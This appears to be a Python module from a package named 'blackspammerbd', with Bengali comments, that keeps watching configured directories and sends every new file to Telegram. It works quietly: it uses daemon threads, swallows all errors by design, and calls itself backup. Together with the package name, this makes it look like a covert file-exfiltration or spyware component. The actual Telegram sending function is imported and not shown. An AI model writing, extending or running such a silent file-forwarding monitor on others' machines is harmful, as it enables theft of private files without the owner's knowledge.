import os
import time
import threading
from blackspammerbd.backup import send_to_telegram
from blackspammerbd.config import watch_dirs, poll_interval
from blackspammerbd.utils import is_hidden

def scan_and_send(seen_files: set):
    """
    watch_dirs-এ উল্লেখিত প্রতিটি ডিরেক্টরি স্ক্যান করে,
    যেকোন নতুন ফাইল পেয়ে গেলে send_to_telegram() কল করবে
    (প্রতিটা আলাদা থ্রেডে)।
    """
    for directory in watch_dirs:
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    filepath = os.path.join(root, file)
                    if is_hidden(filepath):
                        continue
                    if filepath not in seen_files:
                        seen_files.add(filepath)
                        t = threading.Thread(
                            target=send_to_telegram,
                            args=(filepath,),
                            daemon=True
                        )
                        t.start()
        except Exception:
            # কোনো এরর হলেও সাইলেন্টলি পাস করে যাবে
            pass

def monitor_directories():
    """
    প্রথমে পুরানো সব ফাইল seen_files-এ যোগ করে রাখবে,
    যাতে সেগুলো আর Telegram-এ না পাঠায়।
    তারপর অনবরত পুরনো এবং নতুন ফাইল চেক করে,
    নুতন ফাইল এলে সেগুলো Telegram-এ পাঠিয়ে দেবে।
    """
    seen = set()
    for directory in watch_dirs:
        try:
            for root, _, files in os.walk(directory):
                for file in files:
                    fullpath = os.path.join(root, file)
                    if not is_hidden(fullpath):
                        seen.add(fullpath)
        except Exception:
            pass

    while True:
        scan_and_send(seen)
        time.sleep(poll_interval)

# Entry-point হিসেবে ব্যবহার করা হবে
if __name__ == "__main__":
    monitor_directories()
